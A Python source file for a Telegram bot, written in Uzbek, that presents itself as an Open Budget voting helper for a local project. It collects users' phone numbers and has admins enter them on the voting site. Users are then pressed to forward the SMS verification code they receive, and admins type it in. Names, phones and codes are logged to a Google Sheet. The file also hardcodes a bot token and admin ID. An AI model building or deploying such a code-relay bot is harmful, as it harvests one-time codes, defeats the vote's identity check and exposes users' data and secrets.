import asyncio
import logging
import json
import os
import io
import re
import sqlite3
from datetime import datetime
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
import gspread
import openpyxl 
import pandas as pd
from oauth2client.service_account import ServiceAccountCredentials

# --- SOZLAMALAR ---
BOT_TOKEN = "8867325304:AAFHOVKs8HsR8z02tSL8NcUeXmLZlPKCzNQ"
ADMINS = [8317043750]  

GOOGLE_SHEET_NAME = "Qishloq"  

# --- LOGGING VA BOT INITIALIZATSIYASI ---
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

claimed_users = {}
claimed_admin_names = {}
admin_message_ids = {}

# --- FONDA START BOSGANLAR UCHUN SQLITE BAZA ---
def init_db():
    conn = sqlite3.connect("mailing_users.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY
        )
    """)
    conn.commit()
    conn.close()

def add_user_to_db(user_id):
    try:
        conn = sqlite3.connect("mailing_users.db")
        cursor = conn.cursor()
        cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"❌ SQLite xatolik (add): {e}")

def get_all_db_users():
    try:
        conn = sqlite3.connect("mailing_users.db")
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        users = [row[0] for row in cursor.fetchall()]
        conn.close()
        return users
    except Exception as e:
        print(f"❌ SQLite xatolik (get): {e}")
        return []

# Bot yuritilishi bilan bazani tekshirib olamiz
init_db()


# --- GOOGLE SHEETS ULANISH FUNKSIYASI ---
def get_google_sheet():
    scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
    google_creds_env = os.getenv("GOOGLE_CREDS")
    if google_creds_env:
        creds_dict = json.loads(google_creds_env)
        creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_dict, scope)
    else:
        creds = ServiceAccountCredentials.from_json_keyfile_name("open.json", scope)
    client = gspread.authorize(creds)
    return client.open(GOOGLE_SHEET_NAME).sheet1


def log_to_sheets(user_id, full_name="", username="", phone="", code="", status="", admin_name=""):
    try:
        sheet = get_google_sheet()
        all_records = sheet.get_all_values()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        username_str = f"@{username}" if username else "Mavjud emas"
        
        row_index = -1
        for idx, row in enumerate(all_records):
            if len(row) >= 4:
                if row[0] == str(user_id) and row[3] == str(phone):
                    row_index = idx + 1
                    break
        
        if row_index != -1:
            if code: sheet.update_cell(row_index, 5, str(code))
            if status: sheet.update_cell(row_index, 6, status)
            sheet.update_cell(row_index, 7, now)
            if admin_name: sheet.update_cell(row_index, 8, admin_name)
        else:
            sheet.append_row([str(user_id), full_name, username_str, str(phone), str(code), status, now, admin_name])
            
    except Exception as e:
        print(f"❌ Google Sheets xatolik: {e}")


# --- FSM (STATE) HOLATLARI ---
class VoteState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_screenshot = State()
    waiting_for_admin_check = State()  


class AdminState(StatesGroup):
    waiting_for_broadcast_msg = State()


# --- KLAVIATURALAR ---
def main_menu():
    builder = ReplyKeyboardBuilder()
    builder.button(text="🗳 Ovoz berish")
    builder.button(text="🙋‍♂️ Yordam")
    builder.adjust(1, 1)
    return builder.as_markup(resize_keyboard=True)


def admin_menu():
    builder = ReplyKeyboardBuilder()
    builder.button(text="📊 Hisobot (.xlsx)")
    builder.button(text="📢 Xabar yuborish (Mailing)") 
    builder.button(text="⬅️ Bosh menyu")
    builder.adjust(2, 1)
    return builder.as_markup(resize_keyboard=True)

def phone_share_keyboard():
    builder = ReplyKeyboardBuilder()
    builder.button(text="📱 Telefon raqamni yuborish", request_contact=True)
    builder.button(text="❌ Bekor qilish")
    builder.adjust(1)
    return builder.as_markup(resize_keyboard=True)


# --- START BUYRUG'I ---
@dp.message(CommandStart())
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()  
    
    if message.from_user.id not in ADMINS:
        add_user_to_db(message.from_user.id)

    if message.from_user.id in ADMINS:
        await message.answer("🔑 **Admin panelga xush kelibsiz!**", reply_markup=admin_menu())
    else:
        await message.answer(
            "👋 Assalomu alaykum! Open Budget ovoz berish botiga xush kelibsiz.\n\n"
            "QORABAYIR MFYga o'z ovozingizni berib, loyihamiz rivojiga hissa qo'shishingiz mumkin.",
            reply_markup=main_menu()
        )


# --- ADMIN PANEL ---
@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    if message.from_user.id in ADMINS:
        await message.answer("🔑 <b>Admin panelga xush kelibsiz!</b>\n\nQuyidagi tugmalar orqali botni boshqarishingiz mumkin.", parse_mode="HTML", reply_markup=admin_menu())

@dp.message(F.text == "⬅️ Bosh menyu")
async def back_to_main(message: types.Message, state: FSMContext):
    await state.clear()
    if message.from_user.id in ADMINS:
        await message.answer("Admin menyusi:", reply_markup=admin_menu())
    else:
        await message.answer("Bosh menyuga qaytildi.", reply_markup=main_menu())


# --- XABAR YUBORISH (MAILING) ---
@dp.message(F.text == "📢 Xabar yuborish (Mailing)")
async def start_broadcast(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMINS:
        return
    await message.answer(
        "📝 <b>Barcha foydalanuvchilarga yuboriladigan xabarni kiriting.</b>\n\n"
        "Xabar matn shaklida yoki rasm (tagida matni bilan) bo'lishi mumkin.\n"
        "Jarayonni bekor qilish uchun <code>/cancel</code> deb yozing.",
        parse_mode="HTML"
    )
    await state.set_state(AdminState.waiting_for_broadcast_msg)

@dp.message(Command("cancel"), AdminState.waiting_for_broadcast_msg)
async def cancel_broadcast(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("Xabar yuborish jarayoni bekor qilindi.", reply_markup=admin_menu())

@dp.message(AdminState.waiting_for_broadcast_msg)
async def process_broadcast_message(message: types.Message, state: FSMContext):
    if message.from_user.id not in ADMINS:
        return

    await state.clear()
    status_msg = await message.answer("🔄 Baza foydalanuvchilari yuklanmoqda...")

    try:
        user_ids = get_all_db_users()

        if not user_ids:
            await status_msg.edit_text("❌ Bazada hech qanday foydalanuvchi topilmadi.")
            return

        await status_msg.edit_text(f"📢 Xabar tarqatish boshlandi...\nJami foydalanuvchilar: <b>{len(user_ids)} ta</b>", parse_mode="HTML")

        success_count = 0
        fail_count = 0

        for u_id in user_ids:
            try:
                if int(u_id) in ADMINS:
                    continue
                    
                if message.photo:
                    photo_id = message.photo[-1].file_id
                    await bot.send_photo(chat_id=int(u_id), photo=photo_id, caption=message.caption, caption_entities=message.caption_entities)
                else:
                    await bot.send_message(chat_id=int(u_id), text=message.text, entities=message.entities)
                success_count += 1
                await asyncio.sleep(0.05) 
            except Exception:
                fail_count += 1

        await status_msg.delete()
        await message.answer(
            f"✅ <b>Xabar yuborish yakunlandi!</b>\n\n"
            f"🟢 Muvaffaqiyatli yetkazildi: <b>{success_count} ta</b>\n"
            f"🔴 Yetkazib berilmadi (Botni bloklaganlar): <b>{fail_count} ta</b>",
            parse_mode="HTML",
            reply_markup=admin_menu()
        )

    except Exception as e:
        await status_msg.edit_text(f"❌ Xabar yuborishda xatolik yuz berdi: {e}")


# --- 📊 EXCEL HISOBOT ---
@dp.message(F.text == "📊 Hisobot (.xlsx)")
async def send_excel_report(message: types.Message):
    if message.from_user.id not in ADMINS:
        return

    waiting_msg = await message.answer("🔄 Google Sheets'dan ma'lumotlar olinmoqda va Excel shakliga keltirilmoqda, iltimos kuting...")
    
    try:
        sheet = get_google_sheet()
        all_data = sheet.get_all_values()
        
        if not all_data:
            await waiting_msg.edit_text("❌ Jadvalda hech qanday ma'lumot topilmadi.")
            return

        wb = openpyxl.Workbook()
        ws = wb.active
        ws.title = "Hisobot"

        for row in all_data:
            ws.append(row)

        excel_buffer = io.BytesIO()
        wb.save(excel_buffer)
        excel_buffer.seek(0)
        
        file_name = f"OpenBudget_Hisobot_{datetime.now().strftime('%d_%m_%Y')}.xlsx"
        
        await waiting_msg.delete()
        await message.answer_document(
            document=types.BufferedInputFile(excel_buffer.getvalue(), filename=file_name),
            caption=f"📊 <b>Barcha arizalar hisoboti</b>\n\n📅 Sana: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n✅ Yuklab olindi.",
            parse_mode="HTML"
        )
    except Exception as e:
        await waiting_msg.edit_text(f"❌ Xatolik yuz berdi: {e}")


# --- YORDAM BO'LIMI ---
@dp.message(F.text == "🙋‍♂️ Yordam")
async def process_help(message: types.Message):
    inline_kb = InlineKeyboardBuilder()
    inline_kb.button(text="✍️ Operatorga yozish", url="https://t.me/soibnazarov07")
    
    text = (
        "<b>🙋‍♂️ Yordam ko'rsatish markazi</b>\n\n"
        "Sizda biror bir muammo yoki savollar tug'ildimi? 🤷‍♂️\n"
        "• Kod kelmay qoldimi?\n"
        "• Tizimda xatolik beryaptimi?\n\n"
        "Xavotir olmang! Quyidagi tugmani bosib, bizning professional operatorimizga to'g'ridan-to'g'ri murojaat qilishingiz mumkin. Tez fursatda yordam beramiz! 👇"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=inline_kb.as_markup())


# --- OVOZ BERISH START ---
@dp.message(F.text == "🗳 Ovoz berish")
async def start_voting(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    
    await state.clear() 
    
    if user_id in claimed_users: del claimed_users[user_id]
    if user_id in claimed_admin_names: del claimed_admin_names[user_id]
        
    await message.answer(
        "Iltimos, ovoz beradigan telefon raqamingizni quyidagi tugma orqali yuboring yoki qo'lda yozib kiriting:\n\n<b>(Format: +998901234567)</b>",
        parse_mode="HTML", reply_markup=phone_share_keyboard()
    )
    await state.set_state(VoteState.waiting_for_phone)


@dp.message(F.text == "❌ Bekor qilish", VoteState.waiting_for_phone)
async def cancel_voting(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer("Ovoz berish jarayoni bekor qilindi.", reply_markup=main_menu())


# --- RAQAM QABUL QILISH ---
@dp.message(VoteState.waiting_for_phone, F.contact | F.text)
async def process_phone(message: types.Message, state: FSMContext):
    if message.text == "❌ Bekor qilish":
        await state.clear()
        await message.answer("Ovoz berish jarayoni bekor qilindi.", reply_markup=main_menu())
        return

    if message.contact:
        phone = message.contact.phone_number
        if not phone.startswith("+"): phone = "+" + phone
    else:
        phone = message.text

    user_id = message.from_user.id
    full_name = message.from_user.full_name
    username = message.from_user.username

    if user_id in claimed_users: del claimed_users[user_id]
    if user_id in claimed_admin_names: del claimed_admin_names[user_id]

    await state.update_data(phone=phone, full_name=full_name, username=username)
    log_to_sheets(user_id=user_id, full_name=full_name, username=username, phone=phone, status="Raqam kiritildi")

    builder = InlineKeyboardBuilder()
    builder.button(text="✅ Qabul qilish (Band qilish)", callback_data=f"claim_{user_id}")

    admin_message_ids[user_id] = {}
    
    for admin in ADMINS:
        try:
            msg = await bot.send_message(
                admin,
                f"📱 <b>Yangi raqam keldi!</b>\n\n"
                f"👤 Foydalanuvchi: {full_name}\n"
                f"🌐 Username: @{username if username else 'yoq'}\n"
                f"🆔 ID: <code>{user_id}</code>\n"
                f"📞 Raqam: <code>{phone}</code>\n\n"
                f"Kim birinchi bo'lib qabul qilsa, o'sha admin ishlaydi.",
                parse_mode="HTML", reply_markup=builder.as_markup()
            )
            admin_message_ids[user_id][admin] = msg.message_id
        except Exception:
            pass

    await message.answer("Raqamingiz qabul qilindi. Operatorlarimiz tez orada uni tizimga kiritishadi, kuting...", reply_markup=main_menu())


# --- 🔒 ADMIN BAND QILISH ---
@dp.callback_query(F.data.startswith("claim_"))
async def admin_claim(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    admin_id = callback.from_user.id
    admin_name = callback.from_user.full_name

    if user_id in claimed_users:
        already_admin_name = claimed_admin_names.get(user_id, "Boshqa admin")
        await callback.answer(f"❌ Kech qoldingiz! Bu so'rovni {already_admin_name} qabul qilib bo'lgan.", show_alert=True)
        return

    claimed_users[user_id] = admin_id
    claimed_admin_names[user_id] = admin_name
    await callback.answer("Siz ushbu foydalanuvchini muvaffaqiyatli band qildingiz!")

    user_state = dp.fsm.resolve_context(bot, chat_id=user_id, user_id=user_id)
    await user_state.set_state(VoteState.waiting_for_code)
    await user_state.update_data(admin_id=admin_id)
    
    user_data = await user_state.get_data()
    full_name = user_data.get("full_name", "Noma'lum")
    username = user_data.get("username", "")
    phone = user_data.get("phone", "")
    
    log_to_sheets(user_id=user_id, phone=phone, status="Admin qabul qildi", admin_name=admin_name)

    edited_text = (
        f"📱 <b>Yangi raqam keldi!</b>\n\n"
        f"👤 Foydalanuvchi: {full_name}\n"
        f"🌐 Username: @{username if username else 'yoq'}\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"📞 Raqam: <code>{phone}</code>\n\n"
        f"🔒 <b>Ushbu raqamni admin [{admin_name}] qabul qildi!</b>"
    )

    if user_id in admin_message_ids:
        for a_id, m_id in admin_message_ids[user_id].items():
            try:
                await bot.edit_message_text(
                    text=edited_text, chat_id=a_id, message_id=m_id, parse_mode="HTML", reply_markup=None
                )
            except Exception: pass

    resend_kb = InlineKeyboardBuilder()
    resend_kb.button(text="🔄 Kod kelmadi (Qayta so'rash)", callback_data=f"resend_request_{user_id}")
    
    msg = await bot.send_message(
        user_id,
        "Sizning raqamingiz tizimga kiritildi! 📥\n"
        "Telefoningizga kelgan <b>SMS kodni</b> kiriting.\n"
        "⚠️ Vaqtingiz: <b>2:00 daqiqa</b>",
        parse_mode="HTML",
        reply_markup=resend_kb.as_markup()
    )
    asyncio.create_task(countdown_timer(user_id, msg.message_id, user_state))


async def countdown_timer(user_id, message_id, state: FSMContext):
    total_seconds = 120
    while total_seconds > 0:
        await asyncio.sleep(10)
        total_seconds -= 10
        current_state = await state.get_state()
        if current_state != VoteState.waiting_for_code: return

        minutes, seconds = divmod(total_seconds, 60)
        
        resend_kb = InlineKeyboardBuilder()
        resend_kb.button(text="🔄 Kod kelmadi (Qayta so'rash)", callback_data=f"resend_request_{user_id}")
        
        try:
            await bot.edit_message_text(
                chat_id=user_id, message_id=message_id,
                text=f"Telefoningizga kelgan <b>SMS kodni</b> kiriting.\n⚠️ Qolgan vaqt: <b>{minutes:02d}:{seconds:02d} daqiqa</b>",
                parse_mode="HTML",
                reply_markup=resend_kb.as_markup()
            )
        except Exception: pass

    current_state = await state.get_state()
    if current_state == VoteState.waiting_for_code:
        user_data = await state.get_data()
        await state.clear()
        
        if user_id in claimed_users: del claimed_users[user_id]
        if user_id in claimed_admin_names: del claimed_admin_names[user_id]
        if user_id in admin_message_ids: del admin_message_ids[user_id]
        
        await bot.send_message(user_id, "⏱ Vaqt tugadi. Iltimos, qaytadan urinib ko'ring (Ovoz berish tugmasini bosing).")
        log_to_sheets(user_id=user_id, phone=user_data.get("phone", ""), status="Vaqt tugadi")


# --- QAYTA KOD SO'ROVI ---
@dp.callback_query(F.data.startswith("resend_request_"))
async def handle_resend_request(callback: types.CallbackQuery, state: FSMContext):
    user_id = int(callback.data.split("_")[2])
    
    current_state = await state.get_state()
    if current_state != VoteState.waiting_for_code:
        await callback.answer("⚠️ Kech qoldingiz, bu seans yakunlangan.", show_alert=True)
        return
        
    data = await state.get_data()
    admin_id = data.get("admin_id")
    phone = data.get("phone", "Noma'lum")
    full_name = data.get("full_name", "Noma'lum")
    
    try:
        await bot.send_message(
            chat_id=admin_id,
            text=f"🔔 <b>Qayta kod so'ralmoqda!</b>\n\n"
                 f"👤 Foydalanuvchi: {full_name}\n"
                 f"📞 Telefon: <code>{phone}</code>\n"
                 f"⚠️ <i>Foydalanuvchiga SMS bormaganini aytyapti. Iltimos, saytdan qaytadan kod yuborish tugmasini bosing.</i>",
            parse_mode="HTML"
        )
        await callback.answer("🔄 Adminga qayta yuborish so'rovi yetkazildi! Iltimos biroz kuting.", show_alert=True)
    except Exception:
        await callback.answer("❌ So'rovni yetkazishda muammo bo'ldi.", show_alert=True)


# --- KOD KIRITILGANDA ---
@dp.message(VoteState.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text
    data = await state.get_data()
    admin_id = data.get("admin_id")
    user_id = message.from_user.id

    await state.update_data(code=code)
    admin_name = claimed_admin_names.get(user_id, "Noma'lum")
    log_to_sheets(user_id=user_id, phone=data.get("phone", ""), code=code, status="Kod kiritildi", admin_name=admin_name)

    verify_kb = InlineKeyboardBuilder()
    verify_kb.button(text="✅ Kod to'g'ri", callback_data=f"verify_correct_{user_id}")
    verify_kb.button(text="❌ Kod xato", callback_data=f"verify_wrong_{user_id}")
    verify_kb.adjust(2)

    try:
        await bot.send_message(
            admin_id,
            f"🔑 <b>Foydalanuvchidan Kod Keldi!</b>\n\n"
            f"👤 Kimdan: {data.get('full_name')}\n"
            f"📞 Telefon: <code>{data.get('phone')}</code>\n"
            f"🔢 KOD: <code>{code}</code>\n\n"
            f"⚠️ <b>Kodni saytga kiriting va tekshirib tugmalardan birini bosing:</b>",
            parse_mode="HTML",
            reply_markup=verify_kb.as_markup()
        )
    except Exception: pass

    await message.answer("Rahmat! Kod qabul qilindi va tekshiruvga yuborildi. Biroz kuting... ⏱")


# --- KODNI SAYTDAN TEKSHIRISH NATIJASI ---
@dp.callback_query(F.data.startswith("verify_"))
async def handle_code_verification(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    status = parts[1]   
    user_id = int(parts[2])
    admin_id = callback.from_user.id
    admin_name = callback.from_user.full_name

    user_state = dp.fsm.resolve_context(bot, chat_id=user_id, user_id=user_id)
    current_state = await user_state.get_state()
    
    if current_state != VoteState.waiting_for_code:
        await callback.answer("⚠️ Bu sessiya allaqachon yakunlangan yoki o'zgargan.", show_alert=True)
        return

    data = await user_state.get_data()

    if status == "correct":
        log_to_sheets(user_id=user_id, phone=data.get("phone", ""), status="Kod tasdiqlandi (To'g'ri)", admin_name=admin_name)
        
        await callback.message.edit_text(
            text=f"{callback.message.text}\n\n🟢 <b>Natija: Kod saytga muvaffaqiyatli kiritildi! (To'g'ri)</b>",
            parse_mode="HTML", reply_markup=None
        )
        await callback.answer("Kod to'g'ri deb belgilandi!", show_alert=True)
        
        await user_state.set_state(VoteState.waiting_for_screenshot)
        await bot.send_message(
            user_id,
            "🎉 Ajoyib! Siz yuborgan kod muvaffaqiyatli tasdiqlandi.\n\n"
            "Endi telefoningizga kelgan <b>'Sizning ovozingiz muvaffaqiyatli qabul qilindi'</b> degan SMSni skrinshot qilib shu yerga yuboring. 📸"
        )

    elif status == "wrong":
        log_to_sheets(user_id=user_id, phone=data.get("phone", ""), status="Kod xato kiritildi", admin_name=admin_name)
        
        await callback.message.edit_text(
            text=f"{callback.message.text}\n\n🔴 <b>Natija: Kod xato deb belgilandi va foydalanuvchiga qayta so'rov ketdi.</b>",
            parse_mode="HTML", reply_markup=None
        )
        await callback.answer("Kod xato deb belgilandi!", show_alert=True)
        
        resend_kb = InlineKeyboardBuilder()
        resend_kb.button(text="🔄 Kod kelmadi (Qayta so'rash)", callback_data=f"resend_request_{user_id}")
        
        await bot.send_message(
            user_id,
            "⚠️ <b>Afsuski, siz yuborgan kod sayt tomonidan rad etildi (Xato yoki eskirgan).</b>\n\n"
            "Iltimos, SMS kodni tekshirib, **to'g'ri kodni qaytadan yozib yuboring**.",
            parse_mode="HTML",
            reply_markup=resend_kb.as_markup()
        )


# --- SKRINSHOT YUBORILGANDA ---
@dp.message(VoteState.waiting_for_screenshot, F.photo)
async def process_screenshot(message: types.Message, state: FSMContext):
    photo_id = message.photo[-1].file_id
    data = await state.get_data()
    admin_id = data.get("admin_id")
    user_id = message.from_user.id

    admin_name = claimed_admin_names.get(user_id, "Noma'lum")
    log_to_sheets(user_id=user_id, phone=data.get("phone", ""), status="Jarayonda (Skrinshot)", admin_name=admin_name)

    builder = InlineKeyboardBuilder()
    builder.button(text="🟢 Muvaffaqiyatli o'tdi", callback_data=f"check_success_{user_id}")
    builder.button(text="🔴 Avval ovoz bergan", callback_data=f"check_already_{user_id}")
    builder.adjust(1, 1)

    try:
        await bot.send_photo(
            admin_id, photo_id,
            caption=f"📸 <b>Ovoz berilganlik haqida Skrinshot keldi!</b>\n\n"
                    f"👤 Kimdan: {data.get('full_name')}\n"
                    f"📞 Raqam: {data.get('phone')}\n\n"
                    f"Tekshirib qaror qabul qiling:",
            parse_mode="HTML", reply_markup=builder.as_markup()
        )
    except Exception: pass

    await message.answer("Skrinshot qabul qilindi! Ovoz operator tomonidan tekshirilmoqda, kuting... ⏱")
    await state.set_state(VoteState.waiting_for_admin_check)


# --- ADMIN TEKSHIRUV NATIJALARI ---
@dp.callback_query(F.data.startswith("check_"))
async def handle_admin_check(callback: types.CallbackQuery):
    action = callback.data.split("_")[1]
    user_id = int(callback.data.split("_")[2])
    admin_id = callback.from_user.id
    admin_name = callback.from_user.full_name

    if claimed_users.get(user_id) != admin_id:
        owner_name = claimed_admin_names.get(user_id, "Boshqa admin")
        await callback.answer(f"❌ Bu foydalanuvchi {owner_name} ga tegishli! Siz qaror qabul qila olmaysiz.", show_alert=True)
        return

    user_state = dp.fsm.resolve_context(bot, chat_id=user_id, user_id=user_id)
    data = await user_state.get_data()

    if action == "success":
        log_to_sheets(user_id=user_id, phone=data.get("phone", ""), status="Muvaffaqiyatli", admin_name=admin_name)
        try:
            await callback.message.edit_caption(caption=f"{callback.message.caption}\n\n✅ <b>Qaror: Muvaffaqiyatli yakunlandi!</b>", parse_mode="HTML")
        except Exception: pass
            
        await callback.answer("Muvaffaqiyatli deb belgiladingiz!")
        await bot.send_message(user_id, "Tabriklaymiz! Ovozingiz muvaffaqiyatli tasdiqlandi va qabul qilindi. Loyihamizni qo'llab-quvvatlaganingiz uchun rahmat! 🎉", reply_markup=main_menu())
        
        if user_id in claimed_users: del claimed_users[user_id]
        if user_id in claimed_admin_names: del claimed_admin_names[user_id]
        if user_id in admin_message_ids: del admin_message_ids[user_id]
        await user_state.clear()

    elif action == "already":
        log_to_sheets(user_id=user_id, phone=data.get("phone", ""), status="Avval ovoz bergan", admin_name=admin_name)
        try:
            await callback.message.edit_caption(caption=f"{callback.message.caption}\n\n❌ <b>Qaror: Rad etildi (Avval ovoz bergan)</b>", parse_mode="HTML")
        except Exception: pass
            
        await callback.answer("Avval ovoz bergan deb rad etdingiz.")
        await user_state.clear()
        
        if user_id in claimed_users: del claimed_users[user_id]
        if user_id in claimed_admin_names: del claimed_admin_names[user_id]
        if user_id in admin_message_ids: del admin_message_ids[user_id]

        await bot.send_message(user_id, "Uzr, tekshiruv davomida bu raqam orqali avval ham ovoz berilganligi aniqlandi. ❌", reply_markup=main_menu())


# --- BOTNI ISHGA TUSHIRISH ---
async def main():
    print("Bot muvaffaqiyatli ishga tushdi...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
